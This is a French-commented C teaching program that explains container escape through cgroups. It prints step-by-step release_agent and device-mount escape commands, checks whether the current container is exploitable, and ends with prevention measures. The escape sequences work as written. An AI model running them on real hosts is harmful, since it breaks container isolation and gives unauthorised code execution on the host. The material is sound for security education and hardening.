/*
 * OBJECTIF  : Comprendre les evasions via cgroups
 * PREREQUIS : Bases C, containers, cgroups, namespaces
 * COMPILE   : gcc -o example example.c
 *
 * Ce programme demontre les techniques d'evasion de container via
 * cgroups : release_agent abuse, device access, notify_on_release,
 * et les differences entre cgroups v1 et v2.
 * Demonstration pedagogique - pas d'exploitation reelle.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <errno.h>

/*
 * Etape 1 : Rappel sur les cgroups
 */
static void explain_cgroups(void) {
    printf("[*] Etape 1 : Cgroups - Control Groups\n\n");

    printf("    Cgroups = mecanisme du kernel pour limiter les ressources\n\n");

    printf("    ┌─────────────────────────────────────────────┐\n");
    printf("    │              CGROUPS HIERARCHY               │\n");
    printf("    │                                              │\n");
    printf("    │  /sys/fs/cgroup/                             │\n");
    printf("    │  ├── cpu/                                    │\n");
    printf("    │  │   ├── docker/                             │\n");
    printf("    │  │   │   ├── <container_id>/                 │\n");
    printf("    │  │   │   │   ├── cpu.cfs_quota_us            │\n");
    printf("    │  │   │   │   ├── tasks                       │\n");
    printf("    │  │   │   │   └── cgroup.procs                │\n");
    printf("    │  ├── memory/                                 │\n");
    printf("    │  │   ├── docker/<id>/memory.limit_in_bytes   │\n");
    printf("    │  ├── devices/                                │\n");
    printf("    │  │   ├── docker/<id>/devices.allow           │\n");
    printf("    │  └── ... (blkio, pids, freezer, etc.)        │\n");
    printf("    └─────────────────────────────────────────────┘\n\n");

    printf("    Cgroups v1 : hierarchies separees par controleur\n");
    printf("    Cgroups v2 : hierarchie unifiee (un seul arbre)\n\n");
}

/*
 * Etape 2 : Detecter la version de cgroups
 */
static void detect_cgroup_version(void) {
    printf("[*] Etape 2 : Detection de la version cgroups\n\n");

    /* Lire /proc/self/cgroup */
    FILE *fp = fopen("/proc/self/cgroup", "r");
    if (fp) {
        char line[256];
        int is_v2 = 0;
        printf("    /proc/self/cgroup :\n");
        while (fgets(line, sizeof(line), fp)) {
            printf("      %s", line);
            /* Cgroups v2 a une seule ligne avec "0::/" */
            if (strncmp(line, "0::", 3) == 0)
                is_v2 = 1;
        }
        fclose(fp);
        printf("\n    Version detectee : cgroups %s\n\n",
               is_v2 ? "v2 (unifie)" : "v1 (hierarchie)");
    }

    /* Verifier les montages cgroups */
    fp = fopen("/proc/self/mounts", "r");
    if (fp) {
        char line[512];
        printf("    Montages cgroups :\n");
        int count = 0;
        while (fgets(line, sizeof(line), fp)) {
            if (strstr(line, "cgroup")) {
                line[strcspn(line, "\n")] = '\0';
                if (strlen(line) > 75)
                    line[75] = '\0';
                printf("      %s\n", line);
                count++;
            }
        }
        fclose(fp);
        if (count == 0)
            printf("      (aucun montage cgroup visible)\n");
        printf("\n");
    }
}

/*
 * Etape 3 : La technique release_agent (cgroups v1)
 */
static void explain_release_agent(void) {
    printf("[*] Etape 3 : Evasion via release_agent (cgroups v1)\n\n");

    printf("    release_agent : programme execute par le KERNEL quand\n");
    printf("    le dernier processus quitte un cgroup.\n\n");

    printf("    ┌──────────────────────────────────────────────┐\n");
    printf("    │  Le programme release_agent est execute       │\n");
    printf("    │  dans le contexte de l'HOTE, pas du container│\n");
    printf("    │  -> Code execution sur l'hote !              │\n");
    printf("    └──────────────────────────────────────────────┘\n\n");

    printf("    Prerequis :\n");
    printf("    - CAP_SYS_ADMIN (pour mount)\n");
    printf("    - Acces en ecriture aux fichiers cgroup\n");
    printf("    - Container privileged OU cgroup mount accessible\n\n");

    printf("    Sequence d'exploitation :\n\n");

    printf("    1. Monter le cgroup controller :\n");
    printf("       mkdir /tmp/cgrp\n");
    printf("       mount -t cgroup -o rdma cgroup /tmp/cgrp\n\n");

    printf("    2. Creer un sous-cgroup :\n");
    printf("       mkdir /tmp/cgrp/exploit\n\n");

    printf("    3. Activer notify_on_release :\n");
    printf("       echo 1 > /tmp/cgrp/exploit/notify_on_release\n\n");

    printf("    4. Trouver le chemin du filesystem overlay :\n");
    printf("       host_path=$(sed -n 's/.*upperdir=\\([^,]*\\).*/\\1/p' /etc/mtab)\n\n");

    printf("    5. Ecrire le release_agent (sera execute sur l'HOTE) :\n");
    printf("       echo \"$host_path/cmd\" > /tmp/cgrp/release_agent\n\n");

    printf("    6. Creer le script de commande :\n");
    printf("       echo '#!/bin/sh' > /cmd\n");
    printf("       echo 'id > /output' >> /cmd\n");
    printf("       chmod +x /cmd\n\n");

    printf("    7. Declencher le release_agent :\n");
    printf("       sh -c 'echo $$ > /tmp/cgrp/exploit/cgroup.procs'\n");
    printf("       # Le shell se termine -> dernier processus du cgroup\n");
    printf("       # -> release_agent execute sur l'HOTE\n\n");

    printf("    8. Lire le resultat :\n");
    printf("       cat /output  # Contient la sortie de 'id' sur l'hote\n\n");
}

/*
 * Etape 4 : Verifier si l'exploitation est possible
 */
static void check_exploitability(void) {
    printf("[*] Etape 4 : Verification de la faisabilite\n\n");

    int possible = 0;

    /* 1. CAP_SYS_ADMIN */
    FILE *fp = fopen("/proc/self/status", "r");
    if (fp) {
        char line[256];
        while (fgets(line, sizeof(line), fp)) {
            if (strncmp(line, "CapEff:", 7) == 0) {
                unsigned long long caps = 0;
                sscanf(line + 7, " %llx", &caps);
                if (caps & (1ULL << 21)) {
                    printf("    [+] CAP_SYS_ADMIN : present\n");
                    possible = 1;
                } else {
                    printf("    [-] CAP_SYS_ADMIN : absent\n");
                }
                break;
            }
        }
        fclose(fp);
    }

    /* 2. Verifier si on peut monter */
    struct stat st;
    if (stat("/sys/fs/cgroup", &st) == 0) {
        printf("    [+] /sys/fs/cgroup accessible\n");
    } else {
        printf("    [-] /sys/fs/cgroup non accessible\n");
    }

    /* 3. Verifier si release_agent existe */
    const char *ra_paths[] = {
        "/sys/fs/cgroup/release_agent",
        "/sys/fs/cgroup/memory/release_agent",
        "/sys/fs/cgroup/cpu/release_agent",
        "/sys/fs/cgroup/rdma/release_agent",
        NULL
    };

    for (int i = 0; ra_paths[i]; i++) {
        if (access(ra_paths[i], F_OK) == 0) {
            printf("    [+] release_agent existe : %s\n", ra_paths[i]);
            if (access(ra_paths[i], W_OK) == 0) {
                printf("        [!] WRITABLE -> exploitation possible !\n");
                possible = 1;
            }
            break;
        }
    }

    /* 4. Verifier notify_on_release */
    const char *notify_paths[] = {
        "/sys/fs/cgroup/notify_on_release",
        "/sys/fs/cgroup/memory/notify_on_release",
        NULL
    };

    for (int i = 0; notify_paths[i]; i++) {
        fp = fopen(notify_paths[i], "r");
        if (fp) {
            int val = 0;
            if (fscanf(fp, "%d", &val) == 1) {
                printf("    notify_on_release (%s) : %d\n",
                       notify_paths[i], val);
            }
            fclose(fp);
            break;
        }
    }

    printf("\n    Verdict : %s\n\n",
           possible ? "[!] Cgroup escape POTENTIELLEMENT possible"
                    : "[-] Exploitation cgroup peu probable");
}

/*
 * Etape 5 : Evasion via devices (cgroups v1)
 */
static void explain_device_escape(void) {
    printf("[*] Etape 5 : Evasion via devices cgroup\n\n");

    printf("    Le cgroup 'devices' controle l'acces aux peripheriques.\n");
    printf("    Container privileged -> devices.allow = 'a' (tout)\n\n");

    printf("    Exploitation :\n");
    printf("    1. Trouver le disque hote :\n");
    printf("       fdisk -l  OU  ls /dev/sda*\n\n");

    printf("    2. Monter le disque :\n");
    printf("       mkdir /mnt/host\n");
    printf("       mount /dev/sda1 /mnt/host\n\n");

    printf("    3. Acces au filesystem hote :\n");
    printf("       chroot /mnt/host /bin/bash\n\n");

    /* Verifier les devices accessibles */
    printf("    Devices actuellement accessibles :\n");
    const char *devs[] = {
        "/dev/sda", "/dev/sda1", "/dev/vda", "/dev/vda1",
        "/dev/nvme0n1", "/dev/nvme0n1p1", NULL
    };
    int dev_found = 0;
    for (int i = 0; devs[i]; i++) {
        if (access(devs[i], F_OK) == 0) {
            printf("      [%c] %s\n",
                   access(devs[i], R_OK) == 0 ? '+' : '-',
                   devs[i]);
            dev_found = 1;
        }
    }
    if (!dev_found)
        printf("      (aucun device disque direct accessible)\n");
    printf("\n");
}

/*
 * Etape 6 : Cgroups v2 et eBPF
 */
static void explain_cgroupv2(void) {
    printf("[*] Etape 6 : Cgroups v2 et nouvelles attaques\n\n");

    printf("    Cgroups v2 change la donne :\n");
    printf("    - Plus de release_agent dans les sous-groupes\n");
    printf("    - Le release_agent n'est disponible qu'au niveau racine\n");
    printf("    - Meilleure delegation et isolation\n\n");

    printf("    Nouvelles techniques (cgroups v2) :\n");
    printf("    1. eBPF programs attaches aux cgroups\n");
    printf("       -> Si on peut charger des programmes eBPF...\n");
    printf("    2. cgroup namespaces\n");
    printf("       -> Isolation de la vue cgroup\n");
    printf("    3. Unified hierarchy manipulation\n");
    printf("       -> Si on a acces en ecriture\n\n");

    printf("    Impact sur la securite :\n");
    printf("    - Cgroups v2 est plus difficile a exploiter\n");
    printf("    - La technique release_agent classique ne fonctionne plus\n");
    printf("    - Les containers modernes utilisent de plus en plus v2\n\n");
}

/*
 * Etape 7 : Prevention
 */
static void explain_prevention(void) {
    printf("[*] Etape 7 : Prevention des evasions cgroup\n\n");

    printf("    Mesure                 | Effet\n");
    printf("    ───────────────────────|──────────────────────────────\n");
    printf("    Pas de --privileged    | Pas d'acces aux devices\n");
    printf("    Drop CAP_SYS_ADMIN     | Pas de mount cgroup\n");
    printf("    Seccomp profile        | Bloquer mount, unshare\n");
    printf("    Cgroups v2             | Pas de release_agent exploitable\n");
    printf("    Read-only cgroup mount | Empeche la modification\n");
    printf("    Device whitelist       | Restreindre les devices\n");
    printf("    AppArmor/SELinux       | Politique de securite obligatoire\n\n");

    printf("    Docker best practices :\n");
    printf("    docker run --cap-drop ALL --security-opt no-new-privileges \\\n");
    printf("      --security-opt seccomp=default.json \\\n");
    printf("      --read-only --tmpfs /tmp \\\n");
    printf("      --user 1000:1000 image:tag\n\n");
}

int main(void) {
    printf("[*] Demo : Cgroup Escape\n\n");

    explain_cgroups();
    detect_cgroup_version();
    explain_release_agent();
    check_exploitability();
    explain_device_escape();
    explain_cgroupv2();
    explain_prevention();

    printf("[+] Demo terminee avec succes\n");
    return 0;
}
